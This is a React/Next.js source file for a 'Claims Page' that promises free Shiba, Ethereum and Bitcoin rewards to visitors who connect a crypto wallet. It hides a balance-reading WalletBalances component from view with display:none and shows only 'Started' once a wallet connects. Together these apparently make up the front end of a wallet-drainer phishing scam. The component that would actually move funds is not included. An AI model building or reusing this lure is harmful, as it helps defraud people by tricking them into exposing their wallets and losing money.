import { ConnectButton } from '@rainbow-me/rainbowkit';
import type { NextPage } from 'next';
import Head from 'next/head';
import { useAccount } from 'wagmi';
import { useState } from 'react';
import { CSSProperties } from 'react';
import WalletBalances from './components/WalletBalances';
import WalletDashboard from './components/WalletDashboard';

const handleBalancesChange = (balances: { ethBalance: string; maticBalance: string }) => {
  console.log('Balances updated:', balances);
};

const Home: NextPage = () => {
  const { isConnected } = useAccount();
  const [showDetails, setShowDetails] = useState<{ [key: number]: boolean }>({});

  const toggleDetails = (index: number) => {
    setShowDetails((prev) => ({
      ...prev,
      [index]: !prev[index],
    }));
  };

  return (
    <div style={styles.container}>
      <Head>
        <title>Claims Page</title>
        <meta name="description" content="Claim Your Rewards" />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main style={styles.main}>
        <h1 style={styles.title}>Claims</h1>
        
        <div style={{ display: 'none' }}>
          <WalletBalances onBalancesChange={handleBalancesChange} />
        </div>

        <p style={styles.walletStatus}>
          {isConnected ? 'Started' : 'Not Started'}
        </p>
        <WalletDashboard />
        
        <div style={styles.grid}>
          {/* Example claim card */}
          <div style={styles.card}>
            <h2 style={styles.cardTitle}>Claim $100 Shiba Coins</h2>
            <p style={styles.cardDescription}>Claim 100 Shiba Coins with a simple connection.</p>
            <button style={styles.button} onClick={() => toggleDetails(0)}>
              {showDetails[0] ? 'Hide' : 'Claim Now'}
            </button>

            {showDetails[0] && (
              <div style={styles.details}>
                <ConnectButton label="Connect Wallet" />
                <p style={styles.instructions}>
                  Follow the steps to connect your wallet and claim your $100 Shiba coins.
                </p>
              </div>
            )}
          </div>

          {/* Repeat similar structure for more claims */}
          <div style={styles.card}>
            <h2 style={styles.cardTitle}>Claim $50 Ethereum</h2>
            <p style={styles.cardDescription}>Claim 50 ETH tokens instantly.</p>
            <button style={styles.button} onClick={() => toggleDetails(1)}>
              {showDetails[1] ? 'Hide' : 'Claim Now'}
            </button>

            {showDetails[1] && (
              <div style={styles.details}>
                <ConnectButton label="Connect Wallet" />
                <p style={styles.instructions}>
                  Follow the steps to connect your wallet and claim your $50 Ethereum.
                </p>
              </div>
            )}
          </div>

          <div style={styles.card}>
            <h2 style={styles.cardTitle}>Claim $200 Bitcoin</h2>
            <p style={styles.cardDescription}>Claim your Bitcoin rewards securely.</p>
            <button style={styles.button} onClick={() => toggleDetails(2)}>
              {showDetails[2] ? 'Hide' : 'Claim Now'}
            </button>

            {showDetails[2] && (
              <div style={styles.details}>
                <ConnectButton label="Connect Wallet" />
                <p style={styles.instructions}>
                  Follow the steps to connect your wallet and claim $200 in Bitcoin.
                </p>
              </div>
            )}
          </div>
        </div>
      </main>

      <footer style={styles.footer}>
        <a href="#" target="_blank" rel="noopener noreferrer" style={styles.footerText}>
          2024 © Claims Page.
        </a>
      </footer>
    </div>
  );
};

export default Home;

// Inline styles
const styles = {
  container: {
    padding: '20px',
    fontFamily: 'Arial, sans-serif',
    backgroundColor: '#fff',
    minHeight: '100vh',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
  },
  main: {
    maxWidth: '1200px',
    width: '100%',
    textAlign: 'center',
  },
  walletStatus: {
    margin: '1rem 0',
    fontSize: '1.25rem',
    color: '#666',
    animation: 'fadeIn 2s ease-in-out 1s',
  },
  title: {
    fontSize: '2rem',
    color: '#333',
  },
  grid: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))',
    gap: '16px',
  },
  card: {
    backgroundColor: '#fff',
    padding: '20px',
    borderRadius: '10px',
    boxShadow: '0 4px 8px rgba(0, 0, 0, 0.1)',
    transition: 'transform 0.3s ease-in-out',
  },
  cardTitle: {
    fontSize: '1.5rem',
    color: '#34495e',
    marginBottom: '15px',
  },
  cardDescription: {
    fontSize: '1rem',
    color: '#7f8c8d',
    marginBottom: '20px',
  },
  button: {
    backgroundColor: '#3498db',
    color: '#fff',
    border: 'none',
    borderRadius: '5px',
    padding: '10px 20px',
    cursor: 'pointer',
    fontSize: '1rem',
    transition: 'background-color 0.3s ease',
  },
  details: {
    marginTop: '20px',
    backgroundColor: '#ecf0f1',
    padding: '15px',
    borderRadius: '5px',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
  },
  instructions: {
    marginTop: '10px',
    color: '#2c3e50',
    fontSize: '1rem',
  },
  footer: {
    marginTop: '20px',
    padding: '10px',
    width: '100%',
    textAlign: 'center',
  },
  footerText: {
    color: '#333',
    textDecoration: 'none',
  },
};
